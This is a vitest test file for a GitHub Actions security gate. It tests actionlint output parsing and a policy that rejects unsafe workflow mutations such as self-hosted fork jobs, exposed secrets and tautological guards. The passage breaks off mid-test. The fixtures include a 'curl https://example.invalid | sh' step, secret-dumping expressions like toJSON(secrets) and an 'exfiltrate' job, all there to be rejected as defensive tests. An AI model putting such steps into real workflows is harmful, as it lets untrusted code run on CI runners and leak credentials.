import { describe, expect, test } from 'vitest';
import {
  classifyActionlintEvaluation,
  compareToBaseline,
  findingKey,
  parseFindings,
  persistentRunnerPolicyFindings,
  REVIEWED_PHYSICAL_HOST_CAPACITY_ACTION_SHA,
  readWorkflowDocuments,
} from '../actionlint-gate.mjs';

type ParsedWorkflowStep = {
  name?: unknown;
  run?: unknown;
  uses?: unknown;
  with?: Record<string, unknown>;
};

type ParsedWorkflowJob = {
  steps?: ParsedWorkflowStep[];
  with?: Record<string, unknown>;
  'timeout-minutes'?: unknown;
};

type MutableNightlyWorkflow = {
  env?: Record<string, string>;
  defaults?: { run: { 'working-directory': string } };
  jobs: {
    nightly: {
      env: Record<string, string>;
      defaults?: { run: { 'working-directory': string } };
    };
  };
};

/** A verbatim actionlint line, including the colon-bearing shellcheck message
 * that a naive `split(':')` would mangle. */
const REAL_LINE =
  ".github/workflows/install-smoke.yml:44:9: shellcheck reported issue in this script: SC2016:info:98:9: Expressions don't expand in single quotes, use double quotes for that [shellcheck]";
const SAME_REPOSITORY_FAST_CHECKS_CONDITION = `\${{ always() && !cancelled() && ((github.event_name == 'pull_request_target' && github.event.pull_request.head.repo.full_name == github.repository) || github.event_name == 'workflow_dispatch' || needs.classify.outputs.heavy == 'true') }}`;

function securityAnalysisWorkflowDocument() {
  const workflow = readWorkflowDocuments().find(
    ({ file }) => file === '.github/workflows/security-analysis.yml',
  );
  if (!workflow) throw new Error('Expected the checked-in security workflow.');
  return structuredClone(workflow.document) as {
    jobs: Record<
      string,
      { steps: Array<Record<string, unknown>>; [key: string]: unknown }
    >;
  };
}

describe('parseFindings', () => {
  test('parses a real finding whose message itself contains colons', () => {
    const [finding] = parseFindings(REAL_LINE);
    expect(finding).toBeTruthy();
    expect(finding.file).toBe('.github/workflows/install-smoke.yml');
    expect(finding.line).toBe(44);
    expect(finding.rule).toBe('shellcheck');
    expect(finding.message).toContain('SC2016');
  });

  test('ignores actionlint’s source-excerpt lines', () => {
    // actionlint prints the offending source under each finding; those lines
    // must not be counted as additional findings.
    const output = [
      REAL_LINE,
      '   |',
      '44 |         run: |',
      '   |         ^~~~',
    ].join('\n');
    expect(parseFindings(output)).toHaveLength(1);
  });

  test('returns nothing for a usage error rather than inventing findings', () => {
    // This is the text the tool emits when handed a directory. The first draft
    // of this gate parsed exactly this into zero findings and reported OK — a
    // gate that never ran its own tool, calling that a pass.
    const usageError =
      'could not read ".github/workflows": read .github/workflows: is a directory';
    expect(parseFindings(usageError)).toHaveLength(0);
  });
});

describe('compareToBaseline', () => {
  const baselined = parseFindings(REAL_LINE);

  test('a baselined finding does not fail the gate', () => {
    const { unexpected } = compareToBaseline(baselined, [
      '.github/workflows/install-smoke.yml::shellcheck',
    ]);
    expect(unexpected).toHaveLength(0);
  });

  test('a NEW finding fails even while the baseline is non-empty', () => {
    const newFinding = parseFindings(
      '.github/workflows/pages.yml:23:14: undefined variable "nope" [expression]',
    );
    const { unexpected } = compareToBaseline(
      [...baselined, ...newFinding],
      ['.github/workflows/install-smoke.yml::shellcheck'],
    );
    expect(unexpected).toHaveLength(1);
    expect(unexpected[0].rule).toBe('expression');
  });

  test('reports a baselined finding that has been fixed, so the baseline can shrink', () => {
    const { resolved } = compareToBaseline(
      [],
      ['.github/workflows/install-smoke.yml::shellcheck'],
    );
    expect(resolved).toEqual([
      '.github/workflows/install-smoke.yml::shellcheck',
    ]);
  });

  test('keys on file+rule, so a line shift does not read as a new finding', () => {
    // Deliberate trade: an unrelated edit above a finding must not fail the
    // gate, at the cost of not distinguishing two hits of one rule in one file.
    const moved = parseFindings(REAL_LINE.replace(':44:9:', ':190:9:'));
    expect(findingKey(moved[0])).toBe(findingKey(baselined[0]));
    const { unexpected } = compareToBaseline(moved, [
      '.github/workflows/install-smoke.yml::shellcheck',
    ]);
    expect(unexpected).toHaveLength(0);
  });
});

describe('actionlint evaluation integrity', () => {
  test.each([
    [
      'missing workflow directory',
      { workflowDirectoryExists: false },
      { exitCode: 1, reason: 'workflow-directory-missing' },
    ],
    [
      'unavailable actionlint binary',
      { workflowDirectoryExists: true, binary: null },
      { exitCode: 2, reason: 'actionlint-unavailable' },
    ],
    [
      'non-scanning actionlint exit',
      {
        workflowDirectoryExists: true,
        binary: 'actionlint',
        status: 3,
        findings: [],
      },
      { exitCode: 1, reason: 'actionlint-did-not-scan' },
    ],
    [
      'finding exit without parseable findings',
      {
        workflowDirectoryExists: true,
        binary: 'actionlint',
        status: 1,
        findings: [],
      },
      { exitCode: 1, reason: 'actionlint-output-unparseable' },
    ],
  ])('%s cannot report a clean scan', (_name, input, expected) => {
    expect(classifyActionlintEvaluation(input)).toEqual(expected);
  });

  test('accepts only an evaluated clean scan or parseable findings', () => {
    expect(
      classifyActionlintEvaluation({
        workflowDirectoryExists: true,
        binary: 'actionlint',
        status: 0,
        findings: [],
      }),
    ).toEqual({ exitCode: 0, reason: 'evaluated' });
    expect(
      classifyActionlintEvaluation({
        workflowDirectoryExists: true,
        binary: 'actionlint',
        status: 1,
        findings: parseFindings(REAL_LINE),
      }),
    ).toEqual({ exitCode: 0, reason: 'evaluated' });
  });
});

describe('persistent runner policy', () => {
  function primaryCiFixture(mutate: (job: Record<string, unknown>) => void) {
    return primaryCiJobFixture('fork-smoke', mutate);
  }

  function primaryCiJobFixture(
    jobId: string,
    mutate: (job: Record<string, unknown>) => void,
  ) {
    const workflow = readWorkflowDocuments().find(
      ({ file }) => file === '.github/workflows/ci.yml',
    );
    if (!workflow)
      throw new Error('Expected the checked-in primary CI workflow.');
    const document = structuredClone(workflow.document) as {
      jobs: Record<string, Record<string, unknown>>;
    };
    mutate(document.jobs[jobId]);
    return [{ file: workflow.file, document }];
  }

  test('rejects an unguarded self-hosted PR fast-checks job', () => {
    const workflow = readWorkflowDocuments().find(
      ({ file }) => file === '.github/workflows/ci.yml',
    );
    if (!workflow)
      throw new Error('Expected the checked-in primary CI workflow.');
    const document = structuredClone(workflow.document) as {
      jobs: Record<string, Record<string, unknown>>;
    };
    document.jobs['fast-checks'].if =
      `\${{ always() && github.event_name == 'pull_request' }}`;

    expect(
      persistentRunnerPolicyFindings([{ file: workflow.file, document }]),
    ).toContainEqual({
      file: '.github/workflows/ci.yml',
      jobId: 'fast-checks',
      message:
        'ci.yml fast-checks must use the exact same-repository pull_request_target guard',
    });
  });

  test('rejects an OR or tautology that weakens the same-repository guard', () => {
    const workflow = readWorkflowDocuments().find(
      ({ file }) => file === '.github/workflows/ci.yml',
    );
    if (!workflow)
      throw new Error('Expected the checked-in primary CI workflow.');
    const document = structuredClone(workflow.document) as {
      jobs: Record<string, Record<string, unknown>>;
    };
    document.jobs['fast-checks'].if =
      `${SAME_REPOSITORY_FAST_CHECKS_CONDITION.slice(0, -3)} || true }}`;

    expect(
      persistentRunnerPolicyFindings([{ file: workflow.file, document }]),
    ).toContainEqual({
      file: '.github/workflows/ci.yml',
      jobId: 'fast-checks',
      message:
        'ci.yml fast-checks must use the exact same-repository pull_request_target guard',
    });
  });

  test('rejects a self-hosted fork-smoke job', () => {
    expect(
      persistentRunnerPolicyFindings(
        primaryCiFixture((forkSmoke) => {
          forkSmoke['runs-on'] = ['self-hosted', 'Linux'];
        }),
      ),
    ).toContainEqual({
      file: '.github/workflows/ci.yml',
      jobId: 'fork-smoke',
      message: 'fork-smoke must run only on ubuntu-22.04',
    });
  });

  test.each([
    [
      'write token',
      (job: Record<string, unknown>) => {
        job.permissions = { contents: 'write' };
      },
      'fork-smoke must declare only permissions: { contents: read }',
    ],
    [
      'secret reference',
      (job: Record<string, unknown>) => {
        job.env = { TOKEN: `\${{ secrets.FORK_TOKEN }}` };
      },
      'fork-smoke must not reference secrets',
    ],
    [
      'setup-node cache',
      (job: Record<string, unknown>) => {
        const steps = job.steps as Array<Record<string, unknown>>;
        const setupNode = steps.find((step) =>
          String(step.uses).startsWith('actions/setup-node@'),
        );
        if (!setupNode) throw new Error('Expected setup-node in fork-smoke.');
        setupNode.with = { ...(setupNode.with as object), cache: 'npm' };
      },
      'fork-smoke must not use shared or trusted caches',
    ],
  ])('rejects fork-smoke %s contamination', (_name, mutate, expected) => {
    expect(
      persistentRunnerPolicyFindings(primaryCiFixture(mutate)),
    ).toContainEqual({
      file: '.github/workflows/ci.yml',
      jobId: 'fork-smoke',
      message: expected,
    });
  });

  test('rejects a fork-smoke artifact in a shared namespace', () => {
    expect(
      persistentRunnerPolicyFindings(
        primaryCiFixture((forkSmoke) => {
          (forkSmoke.steps as Array<Record<string, unknown>>).push({
            uses: 'actions/upload-artifact@full-sha',
            with: { name: 'ci-fast-verification' },
          });
        }),
      ),
    ).toContainEqual({
      file: '.github/workflows/ci.yml',
      jobId: 'fork-smoke',
      message: 'fork-smoke must not use shared artifact namespaces',
    });
  });

  test('reserves pull_request_target for reviewed base-controlled PR workflows', () => {
    expect(
      persistentRunnerPolicyFindings([
        {
          file: '.github/workflows/unsafe-target.yml',
          document: {
            on: { pull_request_target: {} },
            jobs: {
              untrusted: {
                'runs-on': 'ubuntu-22.04',
                steps: [{ uses: 'actions/checkout@full-sha' }],
              },
            },
          },
        },
      ]),
    ).toContainEqual({
      file: '.github/workflows/unsafe-target.yml',
      jobId: 'workflow',
      message:
        'pull_request_target is reserved for reviewed base-controlled PR workflows',
    });
  });

  test('rejects a candidate-controlled pull_request workflow with a self-hosted route', () => {
    const workflow = readWorkflowDocuments().find(
      ({ file }) => file === '.github/workflows/ci.yml',
    );
    if (!workflow)
      throw new Error('Expected the checked-in primary CI workflow.');
    const document = structuredClone(workflow.document) as {
      jobs: Record<string, Record<string, unknown>>;
      on: Record<string, unknown>;
    };
    document.on = { pull_request: { branches: ['main'] } };

    expect(
      persistentRunnerPolicyFindings([{ file: workflow.file, document }]),
    ).toContainEqual({
      file: '.github/workflows/ci.yml',
      jobId: 'workflow',
      message:
        'candidate-controlled pull_request workflows are prohibited; use the reviewed pull_request_target topology',
    });
  });

  test('fails closed when a reviewed router job is removed', () => {
    const workflow = readWorkflowDocuments().find(
      ({ file }) => file === '.github/workflows/ci.yml',
    );
    if (!workflow)
      throw new Error('Expected the checked-in primary CI workflow.');
    const document = structuredClone(workflow.document) as {
      jobs: Record<string, Record<string, unknown>>;
    };
    delete document.jobs.classify;

    expect(
      persistentRunnerPolicyFindings([{ file: workflow.file, document }]),
    ).toContainEqual({
      file: '.github/workflows/ci.yml',
      jobId: 'classify',
      message: 'ci.yml pull_request_target router is missing a reviewed job',
    });
  });

  test('rejects every extra checkout in the fork router', () => {
    expect(
      persistentRunnerPolicyFindings(
        primaryCiFixture((forkSmoke) => {
          (forkSmoke.steps as Array<Record<string, unknown>>).push({
            uses: 'actions/checkout@full-sha',
            with: {
              'persist-credentials': false,
              repository: `\${{ github.repository }}`,
              ref: `\${{ github.sha }}`,
            },
          });
        }),
      ),
    ).toContainEqual({
      file: '.github/workflows/ci.yml',
      jobId: 'fork-smoke',
      message:
        'fork-smoke must explicitly check out the pull-request head repository and SHA',
    });
  });

  test('rejects a fork router checkout that defaults to the base repository', () => {
    expect(
      persistentRunnerPolicyFindings(
        primaryCiFixture((forkSmoke) => {
          const checkout = (
            forkSmoke.steps as Array<Record<string, unknown>>
          ).find((step) => String(step.uses).startsWith('actions/checkout@'));
          if (!checkout) throw new Error('Expected fork-smoke checkout.');
          checkout.with = { 'persist-credentials': false };
        }),
      ),
    ).toContainEqual({
      file: '.github/workflows/ci.yml',
      jobId: 'fork-smoke',
      message:
        'fork-smoke must explicitly check out the pull-request head repository and SHA',
    });
  });

  test('requires checksummed actionlint provisioning before fork smoke', () => {
    expect(
      persistentRunnerPolicyFindings(
        primaryCiFixture((forkSmoke) => {
          const steps = forkSmoke.steps as Array<Record<string, unknown>>;
          const provisionIndex = steps.findIndex(
            (step) => step.name === 'Install pinned actionlint',
          );
          const [provision] = steps.splice(provisionIndex, 1);
          steps.push(provision);
        }),
      ),
    ).toContainEqual({
      file: '.github/workflows/ci.yml',
      jobId: 'fork-smoke',
      message:
        'fork-smoke must provision pinned and checksummed actionlint before smoke execution',
    });
  });

  test.each([
    ['fast-checks', 'Run fast CI lane', 'fast CI execution'],
    ['fork-smoke', 'Run isolated fork smoke', 'smoke execution'],
  ])(
    'requires pinned actionlint before %s execution',
    (jobId, _smokeStep, execution) => {
      expect(
        persistentRunnerPolicyFindings(
          primaryCiJobFixture(jobId, (job) => {
            job.steps = (job.steps as Array<Record<string, unknown>>).filter(
              (step) => step.name !== 'Install pinned actionlint',
            );
          }),
        ),
      ).toContainEqual({
        file: '.github/workflows/ci.yml',
        jobId,
        message:
          jobId === 'fast-checks'
            ? 'fast-checks must provision pinned and checksummed actionlint before fast CI execution'
            : `fork-smoke must provision pinned and checksummed actionlint before ${execution}`,
      });
    },
  );

  test.each([
    [
      'reordered checksum',
      (job: Record<string, unknown>) => {
        const step = (job.steps as Array<Record<string, unknown>>).find(
          (candidate) => candidate.name === 'Install pinned actionlint',
        );
        if (!step || typeof step.run !== 'string')
          throw new Error('Expected actionlint provision step.');
        step.run = step.run.replace(
          'curl --fail',
          'echo "$ACTIONLINT_SHA256  $RUNNER_TEMP/$ACTIONLINT_ARCHIVE" | sha256sum --check --status\ncurl --fail',
        );
      },
    ],
    [
      'appended shell',
      (job: Record<string, unknown>) => {
        const step = (job.steps as Array<Record<string, unknown>>).find(
          (candidate) => candidate.name === 'Install pinned actionlint',
        );
        if (!step || typeof step.run !== 'string')
          throw new Error('Expected actionlint provision step.');
        step.run += '\necho unreviewed';
      },
    ],
  ])('rejects %s actionlint provisioning', (_name, mutate) => {
    expect(
      persistentRunnerPolicyFindings(primaryCiFixture(mutate)),
    ).toContainEqual({
      file: '.github/workflows/ci.yml',
      jobId: 'fork-smoke',
      message:
        'fork-smoke must provision pinned and checksummed actionlint before smoke execution',
    });
  });

  test.each(['fast-checks', 'fork-smoke'])(
    'rejects reordered or appended actionlint provisioning in %s',
    (jobId) => {
      for (const mutate of [
        (job: Record<string, unknown>) => {
          const step = (job.steps as Array<Record<string, unknown>>).find(
            (candidate) => candidate.name === 'Install pinned actionlint',
          );
          if (!step || typeof step.run !== 'string')
            throw new Error('Expected actionlint provision step.');
          step.run = step.run.replace(
            'curl --fail',
            'echo "$ACTIONLINT_SHA256  $RUNNER_TEMP/$ACTIONLINT_ARCHIVE" | sha256sum --check --status\ncurl --fail',
          );
        },
        (job: Record<string, unknown>) => {
          const step = (job.steps as Array<Record<string, unknown>>).find(
            (candidate) => candidate.name === 'Install pinned actionlint',
          );
          if (!step || typeof step.run !== 'string')
            throw new Error('Expected actionlint provision step.');
          step.run += '\necho unreviewed';
        },
      ]) {
        expect(
          persistentRunnerPolicyFindings(primaryCiJobFixture(jobId, mutate)),
        ).toContainEqual({
          file: '.github/workflows/ci.yml',
          jobId,
          message:
            jobId === 'fast-checks'
              ? 'fast-checks must provision pinned and checksummed actionlint before fast CI execution'
              : 'fork-smoke must provision pinned and checksummed actionlint before smoke execution',
        });
      }
    },
  );

  test('rejects an OR tautology in a persistent pull_request_target skip guard', () => {
    const workflow = readWorkflowDocuments().find(
      ({ file }) => file === '.github/workflows/ci.yml',
    );
    if (!workflow)
      throw new Error('Expected the checked-in primary CI workflow.');
    const document = structuredClone(workflow.document) as {
      jobs: Record<string, Record<string, unknown>>;
    };
    document.jobs.classify.if = `\${{ github.event_name != 'pull_request_target' || true }}`;

    expect(
      persistentRunnerPolicyFindings([{ file: workflow.file, document }]),
    ).toContainEqual({
      file: '.github/workflows/ci.yml',
      jobId: 'classify',
      message:
        'persistent ci.yml jobs must use the exact reviewed pull_request_target skip guard',
    });
  });

  test.each([
    `\${{ secrets }}`,
    `\${{ secrets['FORK_TOKEN'] }}`,
    `\${{ toJSON(secrets) }}`,
  ])('rejects semantic secret reference %s in a PR-target job', (secret) => {
    expect(
      persistentRunnerPolicyFindings(
        primaryCiFixture((forkSmoke) => {
          forkSmoke.env = { TOKEN: secret };
        }),
      ),
    ).toContainEqual({
      file: '.github/workflows/ci.yml',
      jobId: 'fork-smoke',
      message: 'fork-smoke must not reference secrets',
    });
  });

  test('rejects secret expressions in PR-target workflow and reusable inputs', () => {
    const workflow = readWorkflowDocuments().find(
      ({ file }) => file === '.github/workflows/desktop-rust.yml',
    );
    if (!workflow)
      throw new Error('Expected the checked-in desktop Rust workflow.');
    const document = structuredClone(workflow.document) as {
      env?: Record<string, unknown>;
      jobs: Record<string, Record<string, unknown>>;
    };
    document.env = { TOKEN: `\${{ toJSON(secrets) }}` };
    document.jobs['desktop-rust'].with = {
      TOKEN: `\${{ secrets['FORK_TOKEN'] }}`,
    };

    const findings = persistentRunnerPolicyFindings([
      { file: workflow.file, document },
    ]);
    expect(findings).toContainEqual({
      file: '.github/workflows/desktop-rust.yml',
      jobId: 'workflow',
      message: 'base-controlled PR workflows must not expose secrets',
    });
    expect(findings).toContainEqual({
      file: '.github/workflows/desktop-rust.yml',
      jobId: 'desktop-rust',
      message: 'base-controlled PR jobs must not expose secrets',
    });
  });

  test.each([
    [
      'workflow write permission',
      (document: {
        permissions?: Record<string, unknown>;
        jobs: Record<string, Record<string, unknown>>;
      }) => {
        document.permissions = { contents: 'write' };
      },
      'workflow',
      'base-controlled PR workflows must declare only permissions: { contents: read }',
    ],
    [
      'job write and id-token permissions',
      (document: {
        permissions?: Record<string, unknown>;
        jobs: Record<string, Record<string, unknown>>;
      }) => {
        document.jobs['desktop-rust'].permissions = {
          contents: 'write',
          'id-token': 'write',
        };
      },
      'desktop-rust',
      'base-controlled PR job permission overrides must declare only permissions: { contents: read }',
    ],
  ])(
    'rejects %s on a base-controlled PR workflow',
    (_name, mutate, jobId, message) => {
      const workflow = readWorkflowDocuments().find(
        ({ file }) => file === '.github/workflows/desktop-rust.yml',
      );
      if (!workflow)
        throw new Error('Expected the checked-in desktop Rust workflow.');
      const document = structuredClone(workflow.document) as {
        permissions?: Record<string, unknown>;
        jobs: Record<string, Record<string, unknown>>;
      };
      mutate(document);

      expect(
        persistentRunnerPolicyFindings([{ file: workflow.file, document }]),
      ).toContainEqual({
        file: '.github/workflows/desktop-rust.yml',
        jobId,
        message,
      });
    },
  );

  test.each([
    [
      'tautological dispatch condition',
      `\${{ true || github.event_name == 'workflow_dispatch' }}`,
    ],
    [
      'different step identity',
      `\${{ github.event_name == 'workflow_dispatch' }}`,
    ],
  ])('rejects secret step exemption with %s', (_name, condition) => {
    const workflow = readWorkflowDocuments().find(
      ({ file }) => file === '.github/workflows/ecosystem-packaging.yml',
    );
    if (!workflow)
      throw new Error('Expected the checked-in ecosystem packaging workflow.');
    const document = structuredClone(workflow.document) as {
      jobs: Record<string, Record<string, unknown>>;
    };
    const secretStep = (
      document.jobs['exercise-clean-macos'].steps as Array<
        Record<string, unknown>
      >
    ).find((step) => step.name === 'Owner-gated external publish boundary');
    if (!secretStep) throw new Error('Expected owner publish step.');
    secretStep.if = condition;
    if (_name === 'different step identity') secretStep.name = 'Different step';

    expect(
      persistentRunnerPolicyFindings([{ file: workflow.file, document }]),
    ).toContainEqual({
      file: '.github/workflows/ecosystem-packaging.yml',
      jobId: 'exercise-clean-macos',
      message: 'base-controlled PR jobs must not expose secrets',
    });
  });

  test('rejects every candidate-controlled pull_request workflow, even on hosted runners', () => {
    expect(
      persistentRunnerPolicyFindings([
        {
          file: '.github/workflows/candidate.yml',
          document: {
            on: { pull_request: {} },
            jobs: { hosted: { 'runs-on': 'ubuntu-22.04', steps: [] } },
          },
        },
      ]),
    ).toContainEqual({
      file: '.github/workflows/candidate.yml',
      jobId: 'workflow',
      message:
        'candidate-controlled pull_request workflows are prohibited; use the reviewed pull_request_target topology',
    });
  });

  test('keeps every automatic PR workflow on the reviewed base-controlled topology', () => {
    const workflows = readWorkflowDocuments();
    const expected = [
      '.github/workflows/ci.yml',
      '.github/workflows/desktop-clean-checkout.yml',
      '.github/workflows/desktop-rust.yml',
      '.github/workflows/ecosystem-packaging.yml',
      '.github/workflows/install-smoke.yml',
      '.github/workflows/security-analysis.yml',
    ];
    for (const file of expected) {
      const document = workflows.find((workflow) => workflow.file === file)
        ?.document as { on?: Record<string, unknown> } | undefined;
      expect(document?.on).toHaveProperty('pull_request_target');
      expect(document?.on).not.toHaveProperty('pull_request');
    }
  });

  test.each([
    [
      'missing base-policy checkout',
      (steps: Array<Record<string, unknown>>) => steps.splice(0, 1),
    ],
    [
      'swapped base-policy and candidate checkouts',
      (steps: Array<Record<string, unknown>>) =>
        ([steps[0], steps[2]] = [steps[2], steps[0]]),
    ],
    [
      'extra checkout',
      (steps: Array<Record<string, unknown>>) =>
        steps.push({ uses: 'actions/checkout@full-sha', with: {} }),
    ],
    [
      'upload SARIF action',
      (steps: Array<Record<string, unknown>>) => {
        steps[3].uses =
          'github/codeql-action/upload-sarif@db488ddef3bf6cb639b32c2e9a7c0a7ea8271d28';
      },
    ],
    [
      'candidate-controlled policy shell',
      (steps: Array<Record<string, unknown>>) => {
        steps[5].run =
          'node candidate/scripts/codeql-sarif-policy.mjs --input="$SARIF"';
      },
    ],
    [
      'extra reusable step',
      (steps: Array<Record<string, unknown>>) =>
        steps.push({ uses: 'example/reusable@full-sha' }),
    ],
  ])('rejects security-analysis %s', (_name, mutate) => {
    const document = securityAnalysisWorkflowDocument();
    mutate(document.jobs.codeql.steps);
    expect(
      persistentRunnerPolicyFindings([
        { file: '.github/workflows/security-analysis.yml', document },
      ]),
    ).toContainEqual({
      file: '.github/workflows/security-analysis.yml',
      jobId: 'codeql',
      message:
        'security-analysis must retain the exact base-policy and candidate checkouts, pinned CodeQL actions, and sole base-policy shell',
    });
  });

  test.each([
    [
      'self-hosted runner',
      (job: Record<string, unknown>) => {
        job['runs-on'] = 'self-hosted';
      },
    ],
    [
      'secret reference',
      (job: Record<string, unknown>) => {
        (job.steps as Array<Record<string, unknown>>)[0].with = {
          // biome-ignore lint/suspicious/noTemplateCurlyInString: literal GitHub expression.
          token: '${{ secrets.DEPENDENCY_REVIEW_TOKEN }}',
        };
      },
    ],
    [
      'candidate checkout',
      (job: Record<string, unknown>) => {
        (job.steps as Array<Record<string, unknown>>).push({
          uses: 'actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5',
          with: { 'persist-credentials': false },
        });
      },
    ],
    [
      'cache action',
      (job: Record<string, unknown>) => {
        (job.steps as Array<Record<string, unknown>>).push({
          uses: 'actions/cache@0c45773b623bea8c8e75f6e6b6b1926af01a47e3',
        });
      },
    ],
    [
      'artifact action',
      (job: Record<string, unknown>) => {
        (job.steps as Array<Record<string, unknown>>).push({
          uses: 'actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02',
        });
      },
    ],
    [
      'unpinned dependency review action',
      (job: Record<string, unknown>) => {
        (job.steps as Array<Record<string, unknown>>)[0].uses =
          'actions/dependency-review-action@v4';
      },
    ],
    [
      'warn-only review',
      (job: Record<string, unknown>) => {
        (
          (job.steps as Array<Record<string, unknown>>)[0].with as Record<
            string,
            unknown
          >
        )['warn-only'] = true;
      },
    ],
    [
      'PR comment',
      (job: Record<string, unknown>) => {
        (
          (job.steps as Array<Record<string, unknown>>)[0].with as Record<
            string,
            unknown
          >
        )['comment-summary-in-pr'] = 'always';
      },
    ],
    [
      'continue-on-error',
      (job: Record<string, unknown>) => {
        job['continue-on-error'] = true;
      },
    ],
    [
      'disabled vulnerability check',
      (job: Record<string, unknown>) => {
        (
          (job.steps as Array<Record<string, unknown>>)[0].with as Record<
            string,
            unknown
          >
        )['vulnerability-check'] = false;
      },
    ],
    [
      'forged dependency refs',
      (job: Record<string, unknown>) => {
        const withInputs = (job.steps as Array<Record<string, unknown>>)[0]
          .with as Record<string, unknown>;
        withInputs['base-ref'] = 'same-ref';
        withInputs['head-ref'] = 'same-ref';
      },
    ],
    [
      'disabled review step',
      (job: Record<string, unknown>) => {
        // biome-ignore lint/suspicious/noTemplateCurlyInString: literal GitHub expression.
        (job.steps as Array<Record<string, unknown>>)[0].if = '${{ false }}';
      },
    ],
    [
      'job container',
      (job: Record<string, unknown>) => {
        job.container = 'node:24';
      },
    ],
    [
      'service container',
      (job: Record<string, unknown>) => {
        job.services = { helper: { image: 'alpine:latest' } };
      },
    ],
  ])('rejects dependency-review %s', (_name, mutate) => {
    const document = securityAnalysisWorkflowDocument();
    mutate(document.jobs['dependency-review']);
    expect(
      persistentRunnerPolicyFindings([
        { file: '.github/workflows/security-analysis.yml', document },
      ]),
    ).toContainEqual({
      file: '.github/workflows/security-analysis.yml',
      jobId: 'dependency-review',
      message:
        'dependency-review must retain the exact hosted pull_request_target action-only topology',
    });
  });

  test.each([
    [
      'all paths ignored',
      (trigger: Record<string, unknown>) => {
        trigger['paths-ignore'] = ['**'];
      },
    ],
    [
      'closed-only event type',
      (trigger: Record<string, unknown>) => {
        trigger.types = ['closed'];
      },
    ],
  ])('rejects dependency-review trigger with %s', (_name, mutate) => {
    const document = securityAnalysisWorkflowDocument() as ReturnType<
      typeof securityAnalysisWorkflowDocument
    > & { on: { pull_request_target: Record<string, unknown> } };
    mutate(document.on.pull_request_target);
    expect(
      persistentRunnerPolicyFindings([
        { file: '.github/workflows/security-analysis.yml', document },
      ]),
    ).toContainEqual({
      file: '.github/workflows/security-analysis.yml',
      jobId: 'workflow',
      message:
        'security-analysis pull_request_target must retain exactly branches: [main] with no event filters',
    });
  });

  test.each(['deleted trigger', 'push-only trigger'])(
    'rejects dependency-review with %s',
    (mutation) => {
      const document = securityAnalysisWorkflowDocument() as ReturnType<
        typeof securityAnalysisWorkflowDocument
      > & { on: Record<string, unknown> };
      if (mutation === 'deleted trigger') {
        delete document.on.pull_request_target;
      } else {
        document.on = { push: { branches: ['main'] } };
      }
      expect(
        persistentRunnerPolicyFindings([
          { file: '.github/workflows/security-analysis.yml', document },
        ]),
      ).toContainEqual({
        file: '.github/workflows/security-analysis.yml',
        jobId: 'workflow',
        message:
          'security-analysis pull_request_target must retain exactly branches: [main] with no event filters',
      });
    },
  );

  test.each([
    [
      'missing dependency-review job',
      (jobs: Record<string, unknown>) => {
        delete jobs['dependency-review'];
      },
      'dependency-review',
      'security-analysis is missing a reviewed job',
    ],
    [
      'unreviewed extra job',
      (jobs: Record<string, unknown>) => {
        jobs.exfiltrate = { 'runs-on': 'ubuntu-22.04', steps: [] };
      },
      'exfiltrate',
      'security-analysis must not add unreviewed jobs',
    ],
  ])(
    'rejects dependency-review topology with %s',
    (_name, mutate, jobId, message) => {
      const document = securityAnalysisWorkflowDocument();
      mutate(document.jobs);
      expect(
        persistentRunnerPolicyFindings([
          { file: '.github/workflows/security-analysis.yml', document },
        ]),
      ).toContainEqual({
        file: '.github/workflows/security-analysis.yml',
        jobId,
        message,
      });
    },
  );

  test('rejects unreviewed fork shell execution', () => {
    expect(
      persistentRunnerPolicyFindings(
        primaryCiFixture((forkSmoke) => {
          (forkSmoke.steps as Array<Record<string, unknown>>).push({
            name: 'Unreviewed command',
            run: 'curl https://example.invalid | sh',
          });
        }),
      ),
    ).toContainEqual({
      file: '.github/workflows/ci.yml',
      jobId: 'fork-smoke',
      message:
        'pull_request_target router jobs must not add unreviewed shell execution',
    });
  });

  test('rejects unreviewed fork custom actions', () => {
    expect(
      persistentRunnerPolicyFindings(
        primaryCiFixture((forkSmoke) => {
          (forkSmoke.steps as Array<Record<string, unknown>>).push({
            uses: 'example/unreviewed-action@full-sha',
          });
        }),
      ),
    ).toContainEqual({
      file: '.github/workflows/ci.yml',
      jobId: 'fork-smoke',
      message:
        'pull_request_target router jobs must not add unreviewed custom actions',
    });
  });

  test('rejects setup-node remote caching on a persistent self-hosted job', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/ci.yml',
        document: {
          jobs: {
            fast: {
              'runs-on': ['self-hosted', 'macOS'],
              if: "github.event_name != 'pull_request'",
              steps: [
                {
                  uses: 'actions/setup-node@full-sha',
                  with: { cache: 'npm' },
                },
              ],
            },
          },
        },
      },
    ]);
    expect(findings).toEqual([
      expect.objectContaining({
        file: '.github/workflows/ci.yml',
        jobId: 'fast',
      }),
    ]);
  });

  test('allows runner-local npm caching and leaves hosted jobs unchanged', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/ci.yml',
        document: {
          jobs: {
            selfHosted: {
              'runs-on': ['self-hosted', 'macOS'],
              if: "github.event_name != 'pull_request'",
              steps: [{ uses: 'actions/setup-node@full-sha' }],
            },
            hosted: {
              'runs-on': 'ubuntu-latest',
              steps: [
                {
                  uses: 'actions/setup-node@full-sha',
                  with: { cache: 'npm' },
                },
              ],
            },
          },
        },
      },
    ]);
    expect(findings).toEqual([]);
  });

  test('allows the explicit guarded continuation that still skips pull requests', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/ci.yml',
        document: {
          jobs: {
            fullRegression: {
              'runs-on': ['self-hosted', 'macOS'],
              if: `\${{ always() && !cancelled() && github.event_name != 'pull_request' }}`,
              steps: [],
            },
          },
        },
      },
    ]);

    expect(findings).toEqual([]);
  });

  test('allows additional conjunctive routing only after the PR exclusion', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/ci.yml',
        document: {
          jobs: {
            classified: {
              'runs-on': ['self-hosted', 'macOS'],
              if: "github.event_name != 'pull_request' && needs.classify.outputs.heavy == 'true'",
              steps: [],
            },
          },
        },
      },
    ]);

    expect(findings).toEqual([]);
  });

  test.each([
    `\${{ always() && !cancelled() }}`,
    `\${{ always() && !cancelled() && github.event_name == 'push' }}`,
    "github.event_name != 'pull_request' || true",
  ])(
    'rejects a continuation expression without an explicit PR exclusion',
    (ifCondition) => {
      const findings = persistentRunnerPolicyFindings([
        {
          file: '.github/workflows/ci.yml',
          document: {
            jobs: {
              unsafeContinuation: {
